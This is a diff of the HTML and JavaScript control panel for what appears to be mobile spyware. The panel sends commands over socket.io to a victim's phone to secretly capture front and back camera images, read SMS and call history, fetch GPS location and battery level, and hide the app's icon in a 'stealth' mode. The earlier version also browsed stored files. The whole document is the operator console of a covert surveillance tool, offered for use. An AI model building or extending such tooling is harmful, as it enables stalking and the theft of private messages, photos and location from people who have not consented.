@@ -1,74 +1,102 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Monitor Dashboard</title>
+    <title>Monitor Control Center</title>
     <script src="/socket.io/socket.io.js"></script>
     <style>
-        body { font-family: sans-serif; background: #1a1a1a; color: white; text-align: center; }
-        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; padding: 20px; }
-        .box { background: #2a2a2a; border-radius: 10px; padding: 15px; border: 1px solid #444; }
-        button { background: #007bff; color: white; border: none; padding: 10px; margin: 5px; cursor: pointer; border-radius: 5px; }
-        button:hover { background: #0056b3; }
-        #log-area { text-align: left; height: 200px; overflow-y: scroll; background: black; padding: 10px; font-family: monospace; font-size: 12px; }
-        img { max-width: 100%; border: 2px solid #00ff00; margin-top: 10px; }
+        body { font-family: 'Segoe UI', sans-serif; background: #0f0f0f; color: white; margin: 0; padding: 20px; }
+        .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #333; padding-bottom: 10px; }
+        .status-dot { height: 12px; width: 12px; border-radius: 50%; display: inline-block; margin-right: 5px; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; margin-top: 20px; }
+        .card { background: #1e1e1e; padding: 20px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
+        button { width: 100%; padding: 12px; margin: 5px 0; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; transition: 0.3s; }
+        .btn-blue { background: #007bff; color: white; }
+        .btn-green { background: #28a745; color: white; }
+        .btn-red { background: #dc3545; color: white; }
+        #log-screen { background: black; color: #00ff00; height: 150px; overflow-y: auto; padding: 10px; font-family: monospace; font-size: 13px; border: 1px solid #444; margin-top: 10px; }
+        img { width: 100%; border-radius: 8px; margin-top: 10px; border: 1px solid #555; }
     </style>
 </head>
 <body>
-    <h1>System Control Panel</h1>
-    <div id="status" style="background:orange; padding:5px;">Connecting...</div>
+
+    <div class="header">
+        <h2>📱 Device Monitor</h2>
+        <div>
+            <span id="dot" class="status-dot" style="background: red;"></span>
+            <span id="status-text">Disconnected</span>
+        </div>
+    </div>
 
     <div class="grid">
-        <div class="box">
-            <h3>Camera & Audio</h3>
-            <button onclick="sendCmd('camera-back')">📸 Back Camera</button>
-            <button onclick="sendCmd('camera-front')">📸 Front Camera</button>
-            <div id="image-container"></div>
+        <div class="card">
+            <h3>🔋 Device Status</h3>
+            <p>Battery: <span id="battery">--</span>%</p>
+            <p>Location: <span id="location">Waiting...</span></p>
+            <button class="btn-blue" onclick="sendCmd('get-gps')">Update GPS Now</button>
         </div>
 
-        <div class="box">
-            <h3>Phone Data</h3>
-            <button onclick="sendCmd('get-sms')">📩 Read SMS</button>
-            <button onclick="sendCmd('get-calls')">📞 Call Logs</button>
-            <button onclick="sendCmd('get-files')">📁 Files</button>
-            <h3>Stealth Mode</h3>
-    <button onclick="sendCmd('hide-icon')" style="background: #dc3545;">👻 Hide Icon</button>
-    <button onclick="sendCmd('show-icon')" style="background: #28a745;">👁️ Show Icon</button>
-            <div id="log-area">Logs will appear here...</div>
+        <div class="card">
+            <h3>📷 Live Capture</h3>
+            <button class="btn-green" onclick="sendCmd('camera-back')">Capture Back Cam</button>
+            <button class="btn-green" onclick="sendCmd('camera-front')">Capture Front Cam</button>
+            <div id="cam-view"></div>
+        </div>
+
+        <div class="card">
+            <h3>📂 Data Logs</h3>
+            <button class="btn-blue" onclick="sendCmd('get-sms')">Read SMS</button>
+            <button class="btn-blue" onclick="sendCmd('get-calls')">Call History</button>
+            <button class="btn-red" onclick="sendCmd('hide-icon')">Stealth: Hide Icon</button>
+            <button class="btn-green" onclick="sendCmd('show-icon')">Show Icon</button>
+            <div id="log-screen">> System Ready...</div>
         </div>
     </div>
 
     <script>
         const socket = io();
-        const logArea = document.getElementById('log-area');
+        const log = document.getElementById('log-screen');
+
+        socket.on('connect', () => {
+            document.getElementById('dot').style.background = "#28a745";
+            document.getElementById('status-text').innerText = "Connected to Server";
+            log.innerHTML += "<br>> Connection Established";
+        });
+
+        socket.on('disconnect', () => {
+            document.getElementById('dot').style.background = "red";
+            document.getElementById('status-text').innerText = "Server Offline";
+        });
 
         function sendCmd(cmd) {
             socket.emit('phone-execute', cmd);
-            logArea.innerHTML += `> Sent: ${cmd}<br>`;
+            log.innerHTML += `<br>> Executing: ${cmd}`;
         }
 
-        socket.on('connect', () => {
-            document.getElementById('status').style.background = "green";
-            document.getElementById('status').innerText = "✅ Connected to Server";
+        // Listen for Battery
+        socket.on('battery-update', (data) => {
+            document.getElementById('battery').innerText = data;
         });
 
-        // Listen for Image Stream
+        // Listen for Location
+        socket.on('location-update', (data) => {
+            document.getElementById('location').innerHTML = 
+                `<a href="https://www.google.com/maps?q=${data.lat},${data.lng}" target="_blank" style="color:#007bff">View on Map</a>`;
+        });
+
+        // Listen for Image
         socket.on('data-stream', (base64) => {
-            document.getElementById('image-container').innerHTML = `<img src="data:image/jpeg;base64,${base64}">`;
+            document.getElementById('cam-view').innerHTML = `<img src="data:image/jpeg;base64,${base64}">`;
+            log.innerHTML += "<br>> Image Received";
         });
 
-        // Listen for SMS, Calls, and Files
+        // Listen for SMS/Calls
         socket.on('sms-data', (data) => {
-            logArea.innerHTML = "<b>--- SMS INBOX ---</b><br>" + data;
+            log.innerHTML = "<b>SMS INBOX:</b><br>" + JSON.stringify(data, null, 2);
         });
 
         socket.on('call-data', (data) => {
-            logArea.innerHTML = "<b>--- RECENT CALLS ---</b><br>" + data;
-        });
-
-        socket.on('file-data', (data) => {
-            logArea.innerHTML = "<b>--- STORAGE FILES ---</b><br>" + data;
+            log.innerHTML = "<b>CALL LOGS:</b><br>" + JSON.stringify(data, null, 2);
         });
     </script>
 </body>
 </html>
-
